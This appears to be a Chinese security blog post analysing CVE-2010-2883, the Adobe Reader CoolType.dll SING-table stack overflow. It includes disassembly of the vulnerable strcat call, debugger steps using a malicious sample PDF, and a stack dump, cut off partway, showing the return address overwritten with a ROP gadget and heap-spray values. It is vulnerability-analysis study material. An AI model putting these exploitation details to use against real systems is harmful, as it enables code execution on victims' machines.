<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="漏洞分析,">










<meta name="description" content="1、漏洞描述CVE-2010-2883是Adobe Reader和Acrobat中的CoolType.dll库在解析字体文件SING表中的uniqueName项时存在的栈溢出漏洞，用户受骗打开了特制的PDF文件就有可能导致执行任意代码。 2、分析环境操作系统：Windows XP SP3虚拟机：VMware 15.2调试器：OllyDbg反汇编器：IDA Pro漏洞软件：Adobe Reader">
<meta name="keywords" content="漏洞分析">
<meta property="og:type" content="article">
<meta property="og:title" content="栈溢出漏洞分析：CVE-2010-2883 Adobe Reader TTF字体SING表栈溢出漏洞">
<meta property="og:url" content="https://pang4ea.github.io/2021/03/14/栈溢出漏洞分析：CVE-2010-2883 Adobe Reader TTF字体SING表栈溢出漏洞/index.html">
<meta property="og:site_name" content="Pang4ea">
<meta property="og:description" content="1、漏洞描述CVE-2010-2883是Adobe Reader和Acrobat中的CoolType.dll库在解析字体文件SING表中的uniqueName项时存在的栈溢出漏洞，用户受骗打开了特制的PDF文件就有可能导致执行任意代码。 2、分析环境操作系统：Windows XP SP3虚拟机：VMware 15.2调试器：OllyDbg反汇编器：IDA Pro漏洞软件：Adobe Reader">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/06/6uw4yj.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/06/6u4NkD.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/06/6u5s29.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/06/6u5jIS.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6KAv24.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6KV6tf.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6Ke5F0.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6Kub6S.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6KMsKO.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6K1xzt.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6KGebT.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6KG12R.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6KGfiQ.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6KJAFe.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6KNOn1.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6KNztO.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6KUUCF.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6KafiT.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6Ka7LR.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6KdVfS.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6Kwt4f.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6KrhJx.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6KrXFI.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6KsPmQ.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6KsepV.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6Ksl79.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6Kst1K.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6KsWng.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6KsINn.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6KyS41.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6KyijO.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6KyuCt.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6Ky2P1.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6KywvT.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6K6LTJ.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6KguCR.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6KRo4J.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/03/07/6K4ADx.png">
<meta property="og:updated_time" content="2021-03-14T14:33:29.178Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="栈溢出漏洞分析：CVE-2010-2883 Adobe Reader TTF字体SING表栈溢出漏洞">
<meta name="twitter:description" content="1、漏洞描述CVE-2010-2883是Adobe Reader和Acrobat中的CoolType.dll库在解析字体文件SING表中的uniqueName项时存在的栈溢出漏洞，用户受骗打开了特制的PDF文件就有可能导致执行任意代码。 2、分析环境操作系统：Windows XP SP3虚拟机：VMware 15.2调试器：OllyDbg反汇编器：IDA Pro漏洞软件：Adobe Reader">
<meta name="twitter:image" content="https://s3.ax1x.com/2021/03/06/6uw4yj.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://pang4ea.github.io/2021/03/14/栈溢出漏洞分析：CVE-2010-2883 Adobe Reader TTF字体SING表栈溢出漏洞/">





  <title>栈溢出漏洞分析：CVE-2010-2883 Adobe Reader TTF字体SING表栈溢出漏洞 | Pang4ea</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Pang4ea</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-schedule">
          <a href="/schedule/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br>
            
            日程表
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://pang4ea.github.io/2021/03/14/栈溢出漏洞分析：CVE-2010-2883 Adobe Reader TTF字体SING表栈溢出漏洞/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="pang4ea">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pang4ea">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">栈溢出漏洞分析：CVE-2010-2883 Adobe Reader TTF字体SING表栈溢出漏洞</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-03-14T22:38:31+08:00">
                2021-03-14
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/《漏洞战争》/" itemprop="url" rel="index">
                    <span itemprop="name">《漏洞战争》</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h2 id="1、漏洞描述"><a href="#1、漏洞描述" class="headerlink" title="1、漏洞描述"></a>1、漏洞描述</h2><p>CVE-2010-2883是Adobe Reader和Acrobat中的CoolType.dll库在解析字体文件SING表中的uniqueName项时存在的栈溢出漏洞，用户受骗打开了特制的PDF文件就有可能导致执行任意代码。</p>
<h2 id="2、分析环境"><a href="#2、分析环境" class="headerlink" title="2、分析环境"></a>2、分析环境</h2><p>操作系统：Windows XP SP3<br>虚拟机：VMware 15.2<br>调试器：OllyDbg<br>反汇编器：IDA Pro<br>漏洞软件：Adobe Reader 9.3.4</p>
<h2 id="3、定位漏洞位置"><a href="#3、定位漏洞位置" class="headerlink" title="3、定位漏洞位置"></a>3、定位漏洞位置</h2><p>用IDA打开CoolType.dll库，查看字符串，找到“SING”字体，该字符串是漏洞解析出错的地方，直接定位进去查看该库对sing表格的解析方式，主要是strcat造成的溢出漏洞：<br><a href="https://imgtu.com/i/6uw4yj" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/06/6uw4yj.png" alt="6uw4yj.png"></a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">.text:0803DCF9                 push    ebp</span><br><span class="line">.text:0803DCFA                 sub     esp, 104h</span><br><span class="line">.text:0803DD00                 lea     ebp, [esp-4]</span><br><span class="line">.text:0803DD04                 mov     eax, ___security_cookie</span><br><span class="line">.text:0803DD09                 xor     eax, ebp</span><br><span class="line">.text:0803DD0B                 mov     [ebp+108h+var_4], eax</span><br><span class="line">.text:0803DD11                 push    4Ch</span><br><span class="line">.text:0803DD13                 mov     eax, offset sub_8184A54</span><br><span class="line">.text:0803DD18                 call    __EH_prolog3_catch</span><br><span class="line">.text:0803DD1D                 mov     eax, [ebp+108h+arg_C]</span><br><span class="line">.text:0803DD23                 mov     edi, [ebp+108h+arg_0]</span><br><span class="line">.text:0803DD29                 mov     ebx, [ebp+108h+arg_4]</span><br><span class="line">.text:0803DD2F                 mov     [ebp+108h+var_130], edi</span><br><span class="line">.text:0803DD32                 mov     [ebp+108h+var_138], eax</span><br><span class="line">.text:0803DD35                 call    sub_804172C</span><br><span class="line">.text:0803DD3A                 xor     esi, esi</span><br><span class="line">.text:0803DD3C                 cmp     dword ptr [edi+8], 3</span><br><span class="line">.text:0803DD40                 mov     [ebp+108h+var_10C], esi</span><br><span class="line">.text:0803DD43                 jz      loc_803DF00</span><br><span class="line">.text:0803DD49                 mov     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DD4C                 mov     [ebp+108h+var_120], esi</span><br><span class="line">.text:0803DD4F                 cmp     dword ptr [edi+0Ch], 1</span><br><span class="line">.text:0803DD53                 mov     byte ptr [ebp+108h+var_10C], 1</span><br><span class="line">.text:0803DD57                 jnz     loc_803DEA9</span><br><span class="line">.text:0803DD5D                 push    offset aName    ; &quot;name&quot;</span><br><span class="line">.text:0803DD62                 push    edi             ; int</span><br><span class="line">.text:0803DD63                 lea     ecx, [ebp+108h+var_124]</span><br><span class="line">.text:0803DD66                 mov     [ebp+108h+var_119], 0</span><br><span class="line">.text:0803DD6A                 call    sub_80217D7</span><br><span class="line">.text:0803DD6F                 cmp     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DD72                 jnz     short loc_803DDDD</span><br><span class="line">.text:0803DD74                 push    offset aSing    ; &quot;SING&quot;</span><br><span class="line">.text:0803DD79                 push    edi             ; int</span><br><span class="line">.text:0803DD7A                 lea     ecx, [ebp+108h+var_12C]  //指向sing表入口</span><br><span class="line">.text:0803DD7D                 call    sub_8021B06</span><br><span class="line">.text:0803DD82                 mov     eax, [ebp+108h+var_12C]</span><br><span class="line">.text:0803DD85                 cmp     eax, esi //判断是否为空</span><br><span class="line">.text:0803DD87                 mov     byte ptr [ebp+108h+var_10C], 2</span><br><span class="line">.text:0803DD8B                 jz      short loc_803DDC4   //为空则跳转</span><br><span class="line">.text:0803DD8D                 mov     ecx, [eax]   //字体资源版本号，这里为1.0，即00 01 00 00</span><br><span class="line">.text:0803DD8F                 and     ecx, 0FFFFh</span><br><span class="line">.text:0803DD95                 jz      short loc_803DD9F</span><br><span class="line">.text:0803DD97                 cmp     ecx, 100h</span><br><span class="line">.text:0803DD9D                 jnz     short loc_803DDC0</span><br><span class="line">.text:0803DD9F</span><br><span class="line">.text:0803DD9F loc_803DD9F:                            ; CODE XREF: sub_803DCF9+9Cj</span><br><span class="line">.text:0803DD9F                 add     eax, 10h</span><br><span class="line">.text:0803DDA2                 push    eax             ; char * uniqueName域</span><br><span class="line">.text:0803DDA3                 lea     eax, [ebp+108h+var_108]</span><br><span class="line">.text:0803DDA6                 push    eax             ; char * 目的地址</span><br><span class="line">.text:0803DDA7                 mov     [ebp+108h+var_108], 0</span><br><span class="line">.text:0803DDAB                 call    strcat   //造成溢出</span><br></pre></td></tr></table></figure>

<p>Adobe Reader在调用strcat时，未对uniqueName字段的字符串长度进行检测，直接复制到固定大小的栈空间，最终导致栈溢出。</p>
<h2 id="4、动态调试"><a href="#4、动态调试" class="headerlink" title="4、动态调试"></a>4、动态调试</h2><p>把Adobe Reader 9.3.4载入OD，加载之后按F9运行。通过刚刚的静态分析我们了解到SING在地址0x0803DD74处被引用，因此我们可以在OD中在这个地址处下一个断点获取SING表的入口地址。Ctrl+G输入0x0803DD74回车跳转到该地址F2下断点。<br><a href="https://imgtu.com/i/6u4NkD" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/06/6u4NkD.png" alt="6u4NkD.png"></a><br>将样本(名企面试自助手册.pdf)拖入Adobe Reader中，程序就会停在断点处，F7单步到下面的地址。<br><a href="https://imgtu.com/i/6u5s29" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/06/6u5s29.png" alt="6u5s29.png"></a><br>ctrl+G跳转到ecx指向的地址，对里面的数据进行查看。<br><a href="https://imgtu.com/i/6u5jIS" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/06/6u5jIS.png" alt="6u5jIS.png"></a><br>在分析这段数据之前我们先来看看TrueType字体格式标准文档里是怎么说的。<br><a href="https://imgtu.com/i/6KAv24" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6KAv24.png" alt="6KAv24.png"></a><br>在TrueType字体文件中，从0字节偏移的位置开始处有一个表目录。且这个表目录的第一个字段是名为sfnt version是用来表明所用ttf格式版本的字段。在文档中清楚的标注了，对于1.0版本的TTF字体文件开头要用0x00010000来表示版本。回到我们刚才0x046D41F4位置处的数据，会发现开头正好是0x00010000，这就证明了ecx保存的是一个指向ttf对象的指针地址并且在这里应该是作为this指针。<br>接下来遇到了一个call指令，意味着即将调用一个函数。在调用函数前我们先看看这个函数传入了哪些参数。<br><a href="https://imgtu.com/i/6KV6tf" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6KV6tf.png" alt="6KV6tf.png"></a><br>很明显它将SING字符串当作参数了。这里我们单步F8不进入call函数内部。<br><a href="https://imgtu.com/i/6Ke5F0" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6Ke5F0.png" alt="6Ke5F0.png"></a><br>此时eax为0x0423D438，要想知道这块数据是什么，首先用pdfStreamDumper取出PDF样本中的TTF文件。<br><a href="https://imgtu.com/i/6Kub6S" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6Kub6S.png" alt="6Kub6S.png"></a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef struct_SING</span><br><span class="line">&#123;</span><br><span class="line">    char tag[4]     //标记-&gt;SING</span><br><span class="line">    ULONG checkSum  //校验和-&gt;0xD9BCCBB5</span><br><span class="line">    ULONG offset    //相对文件的偏移-&gt;011C</span><br><span class="line">    ULONG length    //数据长度-&gt;0x1DDF</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过观察SING表中的结构我们可以知道在文件偏移0x11C处即是SING表的真实数据，Ctrl+G去到0x11C处，发现和eax所指向的0x0423D438是一致的，如图：<br><a href="https://imgtu.com/i/6KMsKO" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6KMsKO.png" alt="6KMsKO.png"></a><br>以上的指令主要就是将SING表的tag名传入到sub_08021B06函数中通过表目录来获取到SING表的入口地址，而目前eax的值0x046BE598即是SING表的入口地址。分析SING表的这些数据，我们就能知道样本到底做了些什么。<br>接着比较eax和esi的值，检测SING表是否为空，不为空则不跳转。<br><a href="https://imgtu.com/i/6K1xzt" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6K1xzt.png" alt="6K1xzt.png"></a><br>接下来取出eax的内容赋给ecx，通过刚才的分析我们知道此时的ecx保存的是ttf的版本号。<br><a href="https://imgtu.com/i/6KGebT" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6KGebT.png" alt="6KGebT.png"></a><br>然后清零ecx低四位，跳转到add eax,0x10，eax保存的是SING表的入口地址，加上0x10处指向的是uniqueName域。<br><a href="https://imgtu.com/i/6KG12R" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6KG12R.png" alt="6KG12R.png"></a><br>继续单步来到strcat溢出点。<br><a href="https://imgtu.com/i/6KGfiQ" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6KGfiQ.png" alt="6KGfiQ.png"></a><br>这里将uniqueName域和当前的ebp入栈，然后调用strcat进行字符串拼接，但是没有进行安全检查，导致溢出，我们单步步过strcat后查看一下ebp开始的栈区数据，可以看到返回地址为icucnv36.4A82A714。<br><a href="https://imgtu.com/i/6KJAFe" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6KJAFe.png" alt="6KJAFe.png"></a><br>此时栈溢出已经发生，函数的返回地址已经被覆盖为SING表中的恶意数据。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">0012E4D8   AD8DE058</span><br><span class="line">0012E4DC   DA55D18A</span><br><span class="line">0012E4E0   4A82A714  icucnv36.4A82A714</span><br><span class="line">0012E4E4   0C0C0C0C</span><br><span class="line">0012E4E8   DF6F2606</span><br><span class="line">0012E4EC   2787E915</span><br><span class="line">0012E4F0   1129D97F</span><br><span class="line">0012E4F4   9B7BA307</span><br><span class="line">0012E4F8   F9D13EFB</span><br><span class="line">0012E4FC   F977C1F6</span><br><span class="line">0012E500   DC7BF416</span><br><span class="line">0012E504   DE535B4A</span><br><span class="line">0012E508   CD8E6928</span><br><span class="line">0012E50C   57E3BF18</span><br><span class="line">0012E510   C834489B</span><br><span class="line">0012E514   2C6DAE69</span><br><span class="line">0012E518   E89428E8</span><br><span class="line">0012E51C   E1C8ADFD</span><br><span class="line">0012E520   2A25ABF1</span><br><span class="line">0012E524   D7900451</span><br><span class="line">0012E528   CC1AB775</span><br><span class="line">0012E52C   B73075D4</span><br><span class="line">0012E530   4C7CFD59</span><br><span class="line">0012E534   DD794F1C</span><br><span class="line">0012E538   4B060C6A</span><br><span class="line">0012E53C   C6FBF0AD</span><br><span class="line">0012E540   0C8F4AD3</span><br><span class="line">0012E544   E3CFD9A2</span><br><span class="line">0012E548   15776EDC</span><br><span class="line">0012E54C   7C91EE9B</span><br><span class="line">0012E550   BBB441C0</span><br><span class="line">0012E554   728A0B6C</span><br><span class="line">0012E558   9663983D</span><br><span class="line">0012E55C   D87ED049</span><br><span class="line">0012E560   41C24868</span><br><span class="line">0012E564   B73D4888</span><br><span class="line">0012E568   7A3C39BF</span><br><span class="line">0012E56C   7B61D7A5</span><br><span class="line">0012E570   E72C648D</span><br><span class="line">0012E574   E9F67011</span><br><span class="line">0012E578   02409992  xpsp2res.02409992</span><br><span class="line">0012E57C   6488953C</span><br><span class="line">0012E580   8B5B7977</span><br><span class="line">0012E584   768FFC5C</span><br><span class="line">0012E588   D89CD8E7</span><br><span class="line">0012E58C   2E39E4E8</span><br><span class="line">0012E590   EA8845E7</span><br><span class="line">0012E594   1C910875</span><br><span class="line">0012E598   6A6DC5A1</span><br><span class="line">0012E59C   EE842286</span><br><span class="line">0012E5A0   0613E3A9  AGM.0613E3A9</span><br><span class="line">0012E5A4   D87BC5D5</span><br><span class="line">0012E5A8   2414CF1B</span><br><span class="line">0012E5AC   3813B989</span><br><span class="line">0012E5B0   B672EE7E</span><br><span class="line">0012E5B4   2129C1C7  AcroForm.2129C1C7</span><br><span class="line">0012E5B8   C2E90B31</span><br><span class="line">0012E5BC   F411EA82</span><br><span class="line">0012E5C0   F56884C9</span><br><span class="line">0012E5C4   9F21F2BD</span><br><span class="line">0012E5C8   1E3F9372</span><br><span class="line">0012E5CC   2D694AEA</span><br><span class="line">0012E5D0   4324B667</span><br><span class="line">0012E5D4   CD738256</span><br><span class="line">0012E5D8   1A3FF2B7</span><br><span class="line">0012E5DC   E92FA997</span><br><span class="line">0012E5E0   AB5427EA</span><br><span class="line">0012E5E4   2909961C</span><br><span class="line">0012E5E8   E3754D54</span><br><span class="line">0012E5EC   B3CD7006</span><br><span class="line">0012E5F0   9F862310</span><br><span class="line">0012E5F4   739F9D5F</span><br><span class="line">0012E5F8   A4F96024</span><br><span class="line">0012E5FC   FF0C0405</span><br><span class="line">0012E600   EA8A6EDB</span><br><span class="line">0012E604   530866AA</span><br><span class="line">0012E608   4A8A08C6  icucnv36.4A8A08C6</span><br><span class="line">0012E60C   B69CF4E1</span><br><span class="line">0012E610   786D1FA2</span><br><span class="line">0012E614   B1CBA5E9</span><br><span class="line">0012E618   940FA0E7</span><br><span class="line">0012E61C   1F5D0737</span><br><span class="line">0012E620   BD5C4228</span><br><span class="line">0012E624   1597D4DB</span><br><span class="line">0012E628   4D0E6B79</span><br><span class="line">0012E62C   E6EE58C4</span><br><span class="line">0012E630   CA443CC4</span><br><span class="line">0012E634   71148AC0</span><br><span class="line">0012E638   8F55C09A</span><br><span class="line">0012E63C   9280F29E</span><br><span class="line">0012E640   CF8079B4</span><br><span class="line">0012E644   7BCD110F</span><br><span class="line">0012E648   243C0A13</span><br><span class="line">0012E64C   12D97D8D</span><br><span class="line">0012E650   54176BAE</span><br><span class="line">0012E654   FAE1B003</span><br><span class="line">0012E658   2B0F18EF</span><br><span class="line">0012E65C   6B7B182F</span><br><span class="line">0012E660   2FE32E1E</span><br><span class="line">0012E664   1ACE5EF6</span><br><span class="line">0012E668   FA892895</span><br><span class="line">0012E66C   96F0EE14</span><br><span class="line">0012E670   AD89E2E0</span><br><span class="line">0012E674   4A77E43C</span><br><span class="line">0012E678   46C2294B</span><br><span class="line">0012E67C   060F1BC3  AGM.060F1BC3</span><br><span class="line">0012E680   C9A24270</span><br><span class="line">0012E684   CA143620</span><br><span class="line">0012E688  